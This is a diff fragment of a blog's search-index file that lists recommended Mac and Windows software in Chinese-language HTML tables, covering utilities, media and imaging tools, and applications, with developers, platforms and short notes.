+<td><a href="https://pilotmoon.com/popclip/" target="_blank" rel="external">PopClip</a></td>
+<td><a href="https://pilotmoon.com/" target="_blank" rel="external">Pilotmoon</a></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">—</td>
+<td style="text-align:center">x</td>
+<td>弹出菜单 效率 鼠标</td>
+</tr>
+<tr>
+<td style="text-align:center">10</td>
+<td><a href="http://www.totalrar.com/total-manager.html" target="_blank" rel="external">Total Manager</a></td>
+<td>etinysoft</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">—</td>
+<td style="text-align:center">x</td>
+<td>Finder 增强</td>
+</tr>
+<tr>
+<td style="text-align:center">11</td>
+<td><a href="https://www.trankynam.com/xtrafinder/" target="_blank" rel="external">XtraFinder</a></td>
+<td><a href="https://www.trankynam.com" target="_blank" rel="external">Tran Ky Nam</a></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">—</td>
+<td style="text-align:center"></td>
+<td>Finder 增强</td>
+</tr>
+<tr>
+<td style="text-align:center">12</td>
+<td><a href="http://unclutterapp.com/" target="_blank" rel="external">Unclutter</a></td>
+<td>Eugene Krupnov</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">—</td>
+<td style="text-align:center">x</td>
+<td>临时存储，替代桌面</td>
+</tr>
+<tr>
+<td style="text-align:center">13</td>
+<td><a href="http://www.xiazaiba.com/html/6081.html" target="_blank" rel="external">DirectX Repair</a></td>
+<td></td>
+<td style="text-align:center">—</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td>DLL 修复</td>
+</tr>
+<tr>
+<td style="text-align:center">14</td>
+<td><a href="https://bjango.com/mac/istatmenus/" target="_blank" rel="external">iStat Menus</a></td>
+<td><a href="https://bjango.com/" target="_blank" rel="external">Bjango Pty Ltd.</a></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">—</td>
+<td style="text-align:center">x</td>
+<td>系统与硬件监控</td>
+</tr>
+<tr>
+<td style="text-align:center">15</td>
+<td><a href="https://www.paragon-software.com/home/ntfs-mac/" target="_blank" rel="external">NTFS for Mac</a></td>
+<td><a href="https://www.paragon-software.com/about.htm" target="_blank" rel="external">Paragon Software Group</a></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">—</td>
+<td style="text-align:center">x</td>
+<td>磁盘格式兼容</td>
+</tr>
+<tr>
+<td style="text-align:center">16</td>
+<td><a href="http://sj.ruanmei.com/" target="_blank" rel="external">软媒时间</a></td>
+<td><a href="http://www.ruanmei.com/" target="_blank" rel="external">软媒</a></td>
+<td style="text-align:center">—</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td>任务栏时间 农历 天气</td>
+</tr>
+<tr>
+<td style="text-align:center">17</td>
+<td><a href="http://www.tongyongpe.com/" target="_blank" rel="external">通用PE工具箱</a></td>
+<td><a href="http://weibo.com/uepon" target="_blank" rel="external">UEPON</a></td>
+<td style="text-align:center">—</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td>v5.0 系统安装</td>
+</tr>
+<tr>
+<td style="text-align:center">18</td>
+<td><a href="https://itunes.apple.com/us/app/blackmagic-disk-speed-test/id425264550?mt=12" target="_blank" rel="external">Disk Speed Test</a></td>
+<td><a href="https://www.blackmagicdesign.com/" target="_blank" rel="external">Blackmagic Design Inc</a></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">—</td>
+<td style="text-align:center"></td>
+<td>硬盘测速</td>
+</tr>
+<tr>
+<td style="text-align:center">19</td>
+<td><a href="http://www.foldersizes.com/" target="_blank" rel="external">FolderSizes</a></td>
+<td><a href="http://www.keymetricsoft.com/" target="_blank" rel="external">Key Metric Software</a></td>
+<td style="text-align:center">—</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">x</td>
+<td>文件夹、文件空间占用分析</td>
+</tr>
+<tr>
+<td style="text-align:center">20</td>
+<td><a href="https://www.piriform.com/recuva" target="_blank" rel="external">Recuva</a></td>
+<td><a href="https://www.piriform.com/about" target="_blank" rel="external">Piriform</a></td>
+<td style="text-align:center">—</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">x</td>
+<td>数据恢复</td>
+</tr>
+<tr>
+<td style="text-align:center">21</td>
+<td><a href="http://www.goodsync.com/" target="_blank" rel="external">GoodSync</a></td>
+<td>Siber Systems Inc.</td>
+<td style="text-align:center"></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">x</td>
+<td>本地文件同步</td>
+</tr>
+<tr>
+<td style="text-align:center">22</td>
+<td><a href="http://www.mediaatelier.com/CheatSheet/" target="_blank" rel="external">CheatSheet</a></td>
+<td></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">—</td>
+<td style="text-align:center"></td>
+<td>快捷键显示</td>
+</tr>
+<tr>
+<td style="text-align:center">23</td>
+<td><a href="http://freemacsoft.net/appcleaner/" target="_blank" rel="external">AppCleaner</a></td>
+<td><a href="http://freemacsoft.net/" target="_blank" rel="external">FreeMacSoft</a></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">—</td>
+<td style="text-align:center"></td>
+<td>卸载应用程序</td>
+</tr>
+<tr>
+<td style="text-align:center">24</td>
+<td><a href="http://macpaw.com/cleanmymac" target="_blank" rel="external">CleanMyMac</a></td>
+<td><a href="http://macpaw.com/" target="_blank" rel="external">MacPaw Inc.</a></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td style="text-align:center">x</td>
+<td>清理优化</td>
+</tr>
+</tbody>
+</table>
+<h2 id="影音图像"><a href="#影音图像" class="headerlink" title="影音图像"></a>影音图像</h2><table>
+<thead>
+<tr>
+<th style="text-align:center">-</th>
+<th>SoftwareName</th>
+<th>　　Developer　　</th>
+<th style="text-align:center">Mac</th>
+<th style="text-align:center">Win</th>
+<th style="text-align:center">Free</th>
+<th>　　　　Note　　　　</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">1</td>
+<td><a href="http://www.babelsoft.net/products.htm" target="_blank" rel="external">Media Preview</a></td>
+<td><a href="http://www.babelsoft.net/" target="_blank" rel="external">博语软件</a></td>
+<td style="text-align:center">—</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td>资源管理器 视频缩略图</td>
+</tr>
+<tr>
+<td style="text-align:center">2</td>
+<td><a href="http://www.enfis.it/cue-splitter-tutorial/" target="_blank" rel="external">CUE Splitter</a></td>
+<td><a href="http://www.medieval.it/" target="_blank" rel="external">Medieval Software</a></td>
+<td style="text-align:center">—</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td>无损音乐分割</td>
+</tr>
+<tr>
+<td style="text-align:center">3</td>
+<td><a href="http://www.mp3tag.de/en/" target="_blank" rel="external">Mp3tag</a></td>
+<td>Florian Heidenreich</td>
+<td style="text-align:center">—</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td>MP3标签修改 去乱码</td>
+</tr>
+<tr>
+<td style="text-align:center">4</td>
+<td><a href="https://en.wikipedia.org/wiki/PotPlayer" target="_blank" rel="external">PotPlayer</a></td>
+<td><a href="https://en.wikipedia.org/wiki/Kakao" target="_blank" rel="external">Daum Communications</a></td>
+<td style="text-align:center">—</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td>视频播放</td>
+</tr>
+<tr>
+<td style="text-align:center">5</td>
+<td><a href="http://pic.2345.com/" target="_blank" rel="external">2345看图王</a></td>
+<td><a href="2345.com">2345.com</a></td>
+<td style="text-align:center">—</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td>图片浏览</td>
+</tr>
+<tr>
+<td style="text-align:center">6</td>
+<td><a href="http://www.pc6.com/softview/SoftView_77375.html" target="_blank" rel="external">魔方图标大师</a></td>
+<td><a href="http://www.ruanmei.com/" target="_blank" rel="external">软媒</a></td>
+<td style="text-align:center">—</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td>图标处理</td>
+</tr>
+<tr>
+<td style="text-align:center">7</td>
+<td><a href="http://www.crsky.com/soft/28076.html" target="_blank" rel="external">全能音频转换通</a></td>
+<td></td>
+<td style="text-align:center">—</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td>v1.2</td>
+</tr>
+<tr>
+<td style="text-align:center">8</td>
+<td><a href="https://en.wikipedia.org/wiki/Adobe_Photoshop" target="_blank" rel="external">Adobe Photoshop</a></td>
+<td><a href="https://en.wikipedia.org/wiki/Adobe_Systems" target="_blank" rel="external">Adobe Systems</a></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td style="text-align:center">x</td>
+<td>图像处理</td>
+</tr>
+<tr>
+<td style="text-align:center">9</td>
+<td><a href="http://www.arcsoft.com/photoplus/" target="_blank" rel="external">ArcSoft Photo+</a></td>
+<td><a href="https://en.wikipedia.org/wiki/ArcSoft" target="_blank" rel="external">ArcSoft</a></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">—</td>
+<td style="text-align:center"></td>
+<td>图片浏览</td>
+</tr>
+<tr>
+<td style="text-align:center">10</td>
+<td><a href="https://en.wikipedia.org/wiki/Inpaint" target="_blank" rel="external">Inpaint</a></td>
+<td><a href="http://www.theinpaint.com/" target="_blank" rel="external">Maxim Gapchenko</a></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td style="text-align:center">x</td>
+<td>抠图，去背景</td>
+</tr>
+<tr>
+<td style="text-align:center">11</td>
+<td><a href="https://en.wikipedia.org/wiki/ScreenFlow" target="_blank" rel="external">ScreenFlow</a></td>
+<td><a href="http://www.telestream.net/company/overview.htm" target="_blank" rel="external">Telestream, Inc.</a></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">—</td>
+<td style="text-align:center">x</td>
+<td>屏幕录制</td>
+</tr>
+<tr>
+<td style="text-align:center">12</td>
+<td><a href="http://www.faststone.org/FSCaptureDetail.htm" target="_blank" rel="external">FastStone Capture</a></td>
+<td><a href="http://www.faststone.org/" target="_blank" rel="external">FastStone Soft</a></td>
+<td style="text-align:center">—</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">x</td>
+<td>截图</td>
+</tr>
+<tr>
+<td style="text-align:center">13</td>
+<td><a href="http://baike.baidu.com/view/2343158.htm" target="_blank" rel="external">SplitIt</a></td>
+<td><a href="http://user.qzone.qq.com/23192069" target="_blank" rel="external">poseidon</a></td>
+<td style="text-align:center">—</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">—</td>
+<td>影音剪切合并</td>
+</tr>
+<tr>
+<td style="text-align:center">14</td>
+<td><a href="http://xee.c3.cx/" target="_blank" rel="external">Xee</a></td>
+<td><a href="http://wakaba.c3.cx/s/" target="_blank" rel="external">Dag Ågren</a></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">—</td>
+<td style="text-align:center">x</td>
+<td>图片浏览</td>
+</tr>
+<tr>
+<td style="text-align:center">15</td>
+<td><a href="http://www.shuimiao.net/info.asp?id=157" target="_blank" rel="external">GIF动画录制精灵</a></td>
+<td><a href="http://www.shuimiao.net/" target="_blank" rel="external">水淼软件</a></td>
+<td style="text-align:center">—</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td></td>
+</tr>
+<tr>
+<td style="text-align:center">16</td>
+<td><a href="http://baike.baidu.com/view/647184.htm" target="_blank" rel="external">MangaMeeya</a></td>
+<td>Manga Underground</td>
+<td style="text-align:center">—</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td>漫画阅读</td>
+</tr>
+<tr>
+<td style="text-align:center">17</td>
+<td><a href="http://www.benvista.com/photozoompro" target="_blank" rel="external">PhotoZoom</a></td>
+<td><a href="http://www.benvista.com/aboutus" target="_blank" rel="external">BenVista Ltd.</a></td>
+<td style="text-align:center"></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">x</td>
+<td>图片无损缩放</td>
+</tr>
+<tr>
+<td style="text-align:center">18</td>
+<td><a href="http://www.snip.qq.com/" target="_blank" rel="external">Snip</a></td>
+<td><a href="http://baike.baidu.com/view/1591.htm" target="_blank" rel="external">腾讯</a></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">—</td>
+<td style="text-align:center"></td>
+<td>截图</td>
+</tr>
+<tr>
+<td style="text-align:center">19</td>
+<td><a href="https://itunes.apple.com/us/app/covered/id860548294?mt=12" target="_blank" rel="external">Covered</a></td>
+<td><a href="http://robheague.com/" target="_blank" rel="external">Rob Heague</a></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">—</td>
+<td style="text-align:center"></td>
+<td>专辑封面下载</td>
+</tr>
+<tr>
+<td style="text-align:center">20</td>
+<td><a href="http://mediacoder.com.cn/" target="_blank" rel="external">MediaCoder</a></td>
+<td>Stanley Huang</td>
+<td style="text-align:center">—</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td>音视频转码</td>
+</tr>
+<tr>
+<td style="text-align:center">21</td>
+<td><a href="https://www.bunkus.org/videotools/mkvtoolnix/" target="_blank" rel="external">MKVToolnix</a></td>
+<td><a href="https://www.bunkus.org/blog/" target="_blank" rel="external">Moritz Bunkus</a></td>
+<td style="text-align:center"></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td>视频音频字幕处理</td>
+</tr>
+<tr>
+<td style="text-align:center">22</td>
+<td><a href="https://itunes.apple.com/app/id940107333" target="_blank" rel="external">iSmartPhoto</a></td>
+<td>Chi Lin</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">—</td>
+<td style="text-align:center">x</td>
+<td>图片管理</td>
+</tr>
+<tr>
+<td style="text-align:center">23</td>
+<td><a href="http://www.collageitfree.com/" target="_blank" rel="external">CollageIt</a></td>
+<td>PearlMountain</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+<td>拼图</td>
+</tr>
+<tr>
+<td style="text-align:center">24</td>
+<td><a href="https://itunes.apple.com/cn/app/bao-feng-ying-yin/id1035547244?mt=12" target="_blank" rel="external">暴风影音</a></td>
+<td><a href="http://www.baofeng.com/" target="_blank" rel="external">暴风科技</a></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+<td>Mac 版很简洁</td>
+</tr>
+<tr>
+<td style="text-align:center">25</td>
+<td><a href="http://mplayerx.org/" target="_blank" rel="external">MPlayerX</a></td>
+<td><a href="http://blog.mplayerx.org/" target="_blank" rel="external">Zongyao Qu</a></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">—</td>
+<td style="text-align:center"></td>
+<td>视频播放</td>
+</tr>
+</tbody>
+</table>
+<h2 id="应用软件"><a href="#应用软件" class="headerlink" title="应用软件"></a>应用软件</h2><table>
+<thead>
+<tr>
+<th style="text-align:center">-</th>
+<th>SoftwareName</th>
+<th>　　Developer　　</th>
+<th style="text-align:center">Mac</th>
+<th style="text-align:center">Win</th>
+<th style="text-align:center">Free</th>
+<th>　　　　Note　　　　</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">1</td>
+<td><a href="http://www.betterzip.com/" target="_blank" rel="external">BetterZip</a></td>
+<td><a href="http://macitbetter.com/" target="_blank" rel="external">MacItBetter</a></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">—</td>
+<td style="text-align:center">x</td>
+<td>解压缩</td>
+</tr>
+<tr>
+<td style="text-align:center">2</td>
+<td><a href="http://haozip.2345.com/" target="_blank" rel="external">2345好压</a></td>
+<td><a href="2345.com">2345.com</a></td>
+<td style="text-align:center">—</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td>解压缩</td>
+</tr>
+<tr>
+<td style="text-align:center">3</td>
+<td><a href="http://us.blackberry.com/software/desktop/blackberry-blend.html" target="_blank" rel="external">BlackBerry Blend</a></td>
+<td><a href="http://us.blackberry.com/" target="_blank" rel="external">BlackBerry</a></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+<td>黑莓文件管理</td>
+</tr>
+<tr>
+<td style="text-align:center">4</td>
+<td><a href="http://www.noiz.io/" target="_blank" rel="external">Noizio</a></td>
+<td>noiz.io</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">—</td>
+<td style="text-align:center"></td>
+<td>白噪音 声效</td>
+</tr>
+<tr>
+<td style="text-align:center">5</td>
+<td><a href="https://www.omnigroup.com/omnifocus/" target="_blank" rel="external">OmniFocus</a></td>
+<td><a href="https://en.wikipedia.org/wiki/The_Omni_Group" target="_blank" rel="external">The Omni Group</a></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">—</td>
+<td style="text-align:center">x</td>
+<td>GTD、任务管理</td>
+</tr>
+<tr>
+<td style="text-align:center">6</td>
+<td><a href="http://www.parallelsdesktop.cn/" target="_blank" rel="external">Parallels Desktop</a></td>
+<td><a href="http://www.dwz.cn/27tepC" target="_blank" rel="external">Parallels</a></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">—</td>
+<td style="text-align:center">x</td>
+<td>虚拟机</td>
+</tr>
+<tr>
+<td style="text-align:center">7</td>
+<td><a href="https://www.rescuetime.com" target="_blank" rel="external">RescueTime</a></td>
+<td></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">—</td>
+<td>时间流水记录</td>
+</tr>
+<tr>
+<td style="text-align:center">8</td>
+<td><a href="https://github.com/xsacha/Sachesi" target="_blank" rel="external">Sachesi</a></td>
+<td><a href="https://github.com/xsacha" target="_blank" rel="external">xsacha</a></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+<td>黑莓刷机</td>
+</tr>
+<tr>
+<td style="text-align:center">9</td>
+<td><a href="http://pinyin.sogou.com/" target="_blank" rel="external">搜狗输入法</a></td>
+<td><a href="http://corp.sogou.com/" target="_blank" rel="external">搜狗</a></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td></td>
+</tr>
+<tr>
+<td style="text-align:center">10</td>
+<td><a href="http://www.yibei.com/software" target="_blank" rel="external">易呗背单词</a></td>
+<td><a href="http://www.yibei.com/" target="_blank" rel="external">易呗</a></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+<td></td>
+</tr>
+<tr>
+<td style="text-align:center">11</td>
+<td><a href="http://www.443w.com/tts/" target="_blank" rel="external">朗读女</a></td>
+<td><a href="http://www.443w.com/" target="_blank" rel="external">阿嘉</a></td>
+<td style="text-align:center"></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td>语音朗读</td>
+</tr>
+<tr>
+<td style="text-align:center">12</td>
+<td><a href="http://www.tongbusj.com/" target="_blank" rel="external">同步助手</a></td>
+<td>宇通博软件</td>
+<td style="text-align:center"></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td>iOS 设备管理</td>
+</tr>
+<tr>
+<td style="text-align:center">13</td>
+<td><a href="http://dict.youdao.com/" target="_blank" rel="external">有道词典</a></td>
+<td><a href="http://baike.baidu.com/view/149363.htm" target="_blank" rel="external">网易公司</a></td>
+<td style="text-align:center"></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td></td>
+</tr>
+<tr>
+<td style="text-align:center">14</td>
+<td><a href="http://ankisrs.net/" target="_blank" rel="external">Anki</a></td>
+<td><a href="http://ichi2.net/" target="_blank" rel="external">Damien Elmes</a></td>
+<td style="text-align:center"></td>
+<td style="text-align:center">√</td>
+<td style="text-align:center"></td>
+<td>卡片辅助记忆</td>
+</tr>
+</tbody>
+</table>
+]]></content>
+      
+        <categories>
+            
+            <category> 来自MOxFIVE的优秀笔记 </category>
+            
+            <category> 软件推荐 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> Windows </tag>
+            
+            <tag> Mac </tag>
+            
+            <tag> Software </tag>
+            
+        </tags>
+        
+    </entry>
+    
+  
+  
+</search>
